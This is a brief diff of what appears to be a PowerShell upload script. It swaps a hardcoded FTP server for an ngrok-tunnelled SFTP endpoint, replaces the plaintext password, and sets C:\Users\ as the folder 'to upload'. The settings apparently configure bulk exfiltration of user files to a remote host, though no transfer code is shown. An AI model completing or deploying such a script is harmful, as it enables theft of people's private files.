@@ -1,7 +1,7 @@
 # FTP Server Variables
-$FTPHost = 'ftp://52.143.167.164/'
+$FTPHost = 'sftp://0.tcp.ngrok.io:13432/'
 $FTPUser = 'dumdumftp' #username
-$FTPPass = 'XwvCQSJ&2(5T43P}g9Z0' #pwd
+$FTPPass = 'p#}Vck,fayt?ipNqYhy9uzcG' #pwd
 
 #Directory where to find shit to upload
 $UploadFolder = "C:\Users\"
